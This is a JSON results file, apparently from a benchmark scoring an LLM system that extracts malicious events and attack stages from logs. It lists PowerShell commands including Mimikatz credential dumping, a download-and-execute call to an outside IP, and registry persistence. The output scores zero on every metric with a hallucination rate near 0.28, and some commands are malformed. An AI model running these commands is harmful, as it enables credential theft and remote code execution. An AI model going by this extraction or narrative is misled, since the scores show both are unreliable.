@@ -1,0 +1,112 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\timestomp.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-Mimikatz.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' '\\\\C:\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C cscript C:\\AtomicRedTeam\\atomics\\T1059.005\\src\\sys_info.vbs > $env:TEMP\\T1059.005.out.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v \"verifierdlls \" /d \"1 \" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C iex (iwr'http://124.223.85.207:8082/a')",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -command \"invoke-webrequest http://124.223.85.207:8082/test.hta -method post -usebasicparsing\", \"#\"\", \"contenttype application/json\"\" ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExpressionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebSocketListener 127.0.0.1 443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-webrequest http://124.223.85.207:8082/test.hta -method post -usebasicparsing -contentType application/json",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C wcevent/add/push -path '\\\\.\\pipe\\push",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c more +2 trojan.exe",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\atomicredteam.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C cscript C:\\AtomicRedTeam\\atomics\\T1218.005\\src\\T1218.005.js > $env:TEMP\\T1218.005.out.js & exit",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attacker used various techniques such as PowerShell scripts, commands, and executables to execute multiple malicious activities. The attack began with PowerShell being executed with elevated privileges, followed by the download and execution of additional malware via internet connectivity. Multiple instances of Mimikatz were triggered, indicating an attempt to extract sensitive information from the system. Additionally, there was an effort to modify image files using PSImage, likely for reconnaissance purposes. Furthermore, a WebSocket connection was established on port 443. These actions suggest an attempt to steal data or maintain persistent access to the compromised system.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 236425,
+      "completion_tokens": 2247,
+      "total_tokens": 238672,
+      "wall_clock_s": 55.983,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 17,
+      "fn": 23
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 17,
+      "fn": 23,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.2777777777777778,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 236425,
+      "completion_tokens": 2247,
+      "total_tokens": 238672,
+      "wall_clock_s": 55.983,
+      "parse_retries": 0
+    }
+  }
+}
